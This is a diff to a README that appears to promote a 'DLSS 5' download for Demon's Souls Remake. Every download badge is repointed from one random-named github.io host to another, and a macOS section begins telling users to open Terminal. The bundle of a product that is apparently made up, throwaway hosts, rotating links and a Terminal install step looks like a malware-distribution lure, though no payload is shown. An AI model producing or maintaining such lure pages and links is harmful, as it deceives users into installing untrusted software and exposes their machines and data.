@@ -16,7 +16,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/⬇_Download_Demon's%20Souls%20Remake_DLSS_5-F9A825?style=for-the-badge&logo=github)](https://supremedeckhandwire.github.io/win-pkg/)
+[![Download](https://img.shields.io/badge/⬇_Download_Demon's%20Souls%20Remake_DLSS_5-F9A825?style=for-the-badge&logo=github)](https://fnwsiyggsoui.github.io/win-setup2/)
 
 </div>
 
@@ -49,9 +49,9 @@
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://supremedeckhandwire.github.io/win-pkg/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://fnwsiyggsoui.github.io/win-setup2/)
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://supremedeckhandwire.github.io/mac-pkg/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://fnwsiyggsoui.github.io/mac-setup2/)
 
 </div>
 
@@ -65,7 +65,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/⬇_Download_DLSS_5_for_Demon's%20Souls%20Remake-F9A825?style=for-the-badge&logo=github)](https://supremedeckhandwire.github.io/win-pkg/)
+[![Download](https://img.shields.io/badge/⬇_Download_DLSS_5_for_Demon's%20Souls%20Remake-F9A825?style=for-the-badge&logo=github)](https://fnwsiyggsoui.github.io/win-setup2/)
 
 </div>
 
@@ -97,7 +97,7 @@
 
 ## 🍎 macOS Installation
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://supremedeckhandwire.github.io/mac-pkg/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://fnwsiyggsoui.github.io/mac-setup2/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
